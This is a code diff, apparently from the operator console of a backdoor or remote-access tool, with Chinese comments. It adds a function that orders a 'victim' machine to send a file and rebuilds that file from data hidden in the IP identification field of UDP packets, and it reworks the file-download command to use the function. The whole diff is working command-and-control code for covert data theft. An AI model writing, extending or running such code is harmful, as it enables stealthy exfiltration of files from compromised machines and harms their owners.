@@ -207,6 +207,69 @@ class Commander:
         self.connected = False
         print("[*] Disconnected from victim.")
 
+    def download_file_with_progress(self, remote_path: str, local_path: str):
+        """
+        向 victim 请求下载文件，并实时打印进度：
+          1) 发送 CMD_GET
+          2) 第一个 2 字节 chunk 解析总长度
+          3) 随后每收到一个 chunk，就更新已收长度并覆盖打印
+          4) 收满后保存到 local_path
+        """
+        # 1) 发送下载命令
+        cmd = f"CMD_GET:{remote_path}".encode()
+        print(f"[*] 请求下载文件 `{remote_path}` …")
+        self.send_covert_message(cmd)
+
+        length = None
+        data = b''
+        start = time.time()
+
+        while True:
+            try:
+                packet, addr = self.sock.recvfrom(65535)
+            except socket.timeout:
+                print("\n[!] 接收超时。")
+                return False
+            # 只关心 victim 返回的 UDP
+            if addr[0] != VICTIM_IP:
+                continue
+
+            # 解析 IP header，拿 identification
+            ip_header = packet[:20]
+            proto = struct.unpack(">BBHHHBBH4s4s", ip_header)[6]
+            if proto != socket.IPPROTO_UDP:
+                continue
+            chunk = struct.pack(">H", struct.unpack(">BBHHHBBH4s4s", ip_header)[3])
+
+            # 2) 读到第一个 chunk，就解析总长度
+            if length is None:
+                length = struct.unpack(">H", chunk)[0]
+                print(f"[Download] 文件总大小：{length} 字节")
+            else:
+                data += chunk
+                # 3) 实时覆盖式打印
+                received = len(data)
+                print(f"[Download] 已接收 {received}/{length} 字节", end='\r')
+
+            # 4) 如果收满，退出
+            if length is not None and len(data) >= length:
+                print()  # 换行
+                break
+
+            # 防止无限循环
+            if time.time() - start > RECV_TIMEOUT:
+                print("\n[!] 总超时，下载失败。")
+                return False
+
+        # 5) 写盘
+        try:
+            with open(local_path, "wb") as f:
+                f.write(data[:length])
+            print(f"[*] 文件已保存到 `{local_path}` ({length} 字节)")
+            return True
+        except Exception as e:
+            print(f"[!] 写入本地文件失败：{e}")
+            return False
 
 # High-level command functions using the Commander class
 def cmd_uninstall(comm: Commander):
@@ -274,28 +337,9 @@ def cmd_put_file(comm: Commander):
 
 
 def cmd_get_file(comm: Commander):
-    remote_path = input("Enter file path on victim to download: ").strip()
-    local_path = input("Enter local save path: ").strip()
-    cmd = f"CMD_GET:{remote_path}".encode()
-    print(f"[*] Requesting file '{remote_path}' from victim...")
-    comm.send_covert_message(cmd)
-    resp = comm.recv_covert_message()
-    if resp is None:
-        print("[!] No response. File might not exist or error occurred.")
-        return
-    # The victim will respond with either an error message or file content.
-    # We need to distinguish if it's an error text or actual file data.
-    # Simple approach: if response begins with "ERR:" it's an error message.
-    if resp.startswith(b"ERR:"):
-        print("[Victim]:", resp.decode())
-    else:
-        # It's file content
-        try:
-            with open(local_path, "wb") as f:
-                f.write(resp)
-            print(f"[*] File received and saved to {local_path} ({len(resp)} bytes).")
-        except Exception as e:
-            print("[!] Failed to save file:", e)
+    remote = input("Enter file path on victim to download: ").strip()
+    local = input("Enter local save path: ").strip() or os.path.basename(remote)
+    comm.download_file_with_progress(remote, local)
 
 
 def cmd_monitor_file(comm: Commander):
